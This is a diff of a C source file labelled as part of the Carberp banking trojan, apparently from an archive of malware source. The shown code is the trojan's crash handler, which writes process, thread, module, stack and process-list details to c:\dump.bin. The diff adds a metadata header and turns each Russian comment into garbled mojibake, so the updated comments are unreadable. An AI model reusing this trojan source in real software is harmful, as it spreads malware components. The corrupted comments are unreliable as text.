@@ -1,3 +1,14 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       вЂ”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     вЂ”
+ */
 #include <windows.h>
 #include <tlhelp32.h>
 
@@ -13,7 +24,7 @@
 #define EXCEPTION_INFO_SIGNATURE		'ecif'
 
 //
-//	Бектрейс стека, по фреймам.
+//	пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ, пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 //	
 VOID StackBackTrace(DWORD MaxCount,DWORD CallStack[])
 {
@@ -79,20 +90,20 @@ HMODULE GetDllHandleByExceptionAddress(const void* ExceptionAddress)
 
 LONG CALLBACK ExceptionHandler(PEXCEPTION_POINTERS ExceptionInfo)
 {
-	// Организуем поток для вывода дампа в файл.
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅ.
 	DUMP::WriteStream s;
 	if (!File_InitDumpWriteStream(&s, L"c:\\dump.bin"))
 	{
-		// Если не получилось открыть поток - просто закрываем приложение.
+		// пїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ - пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 		pExitProcess(0);
 		return EXCEPTION_CONTINUE_EXECUTION;
 	}
 
-	// Организуем форматированный вывод в дамп параметров дампа.
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ.
 	DUMP::Writer NtlvWriter;
 	DUMP::InitWriter(&NtlvWriter, &s);
 
-	// Получаем параметры текущего процесса.
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 	WCHAR ProcessFileName[MAX_PATH];
 	m_memset(ProcessFileName, 0, sizeof(ProcessFileName));
 	pGetModuleFileNameW(NULL, ProcessFileName, ARRAYSIZE(ProcessFileName) - 1);
@@ -101,7 +112,7 @@ LONG CALLBACK ExceptionHandler(PEXCEPTION_POINTERS ExceptionInfo)
 	DUMP::WriteUint32(&NtlvWriter, "ProcessId", GetCurrentProcessId());
 	DUMP::WriteUint32(&NtlvWriter, "ThreadId", GetCurrentThreadId());
 
-	// Получаем параметры нашего модуля, который установил обработчик VEH.
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ VEH.
 	LPVOID BootBase = GetImageBase();
 	DWORD SizeOfBoot = ((PIMAGE_NT_HEADERS)(((PIMAGE_DOS_HEADER)BootBase)->e_lfanew + (LPBYTE)BootBase))->OptionalHeader.SizeOfImage;
 
@@ -111,45 +122,45 @@ LONG CALLBACK ExceptionHandler(PEXCEPTION_POINTERS ExceptionInfo)
 	WCHAR   ModulePath[MAX_PATH];
 	HMODULE ModuleHandle = NULL;
 
-	// Получаем базу модуля, в котором произошло падение.
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ, пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 	ModuleHandle = GetDllHandleByExceptionAddress(ExceptionInfo->ExceptionRecord->ExceptionAddress);
 	
-	// Получаем путь к падучему модулю
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	m_memset(ModulePath, 0, sizeof(ModulePath));
 	pGetModuleFileNameW(ModuleHandle, ModulePath, ARRAYSIZE(ModulePath) - 1);
 
-	// Пишем базу и имя падучего модуля в дамп.
+	// пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅ.
 	DUMP::WriteUint32(&NtlvWriter,  "ExceptionModuleBase", (DWORD)ModuleHandle);
 	DUMP::WriteStringW(&NtlvWriter, "ExceptionModulePath", ModulePath);
 
-	// Пишем ExceptionRecord исключения
+	// пїЅпїЅпїЅпїЅпїЅ ExceptionRecord пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	DUMP::WriteByteArray(&NtlvWriter, "ExceptionRecord", ExceptionInfo->ExceptionRecord, 
 		sizeof(EXCEPTION_RECORD));
 
-	// Пишем Context Frame исключения
+	// пїЅпїЅпїЅпїЅпїЅ Context Frame пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	DUMP::WriteByteArray(&NtlvWriter, "ContextRecord", &ExceptionInfo->ContextRecord,
 		sizeof(CONTEXT));
 
-	// Получаем стек вызовов.
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 	DWORD CallStack[MAX_COUNT_CALL_STASK_ADDR];
 	StackBackTrace(MAX_COUNT_CALL_STASK_ADDR, CallStack);
 
 	DUMP::WriteByteArray(&NtlvWriter, "CallStack", CallStack, sizeof(CallStack));
 
-	// Получаем минидамп исполняемого кода в окружности точки падения.
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 	DUMP::WriteByteArray(&NtlvWriter, "MiniDump", 
 		(PVOID)((PCHAR)ExceptionInfo->ExceptionRecord->ExceptionAddress - MINIDUMP_SIZE/2),
 		MINIDUMP_SIZE);
 
-	// Записываем список текущих процессов.
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 	AddProcessListToDump(&NtlvWriter);
 
-	// Закрываем поток для вывода дампа.
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ.
 	s.Finish(&s);
 	
 	// WARNING: 
-	// Надо обязательно закрыть процесс, иначе он может войти в бесконечный 
-	// цикл.
+	// пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ 
+	// пїЅпїЅпїЅпїЅ.
 	pExitProcess(0);
 
 	return EXCEPTION_CONTINUE_EXECUTION;
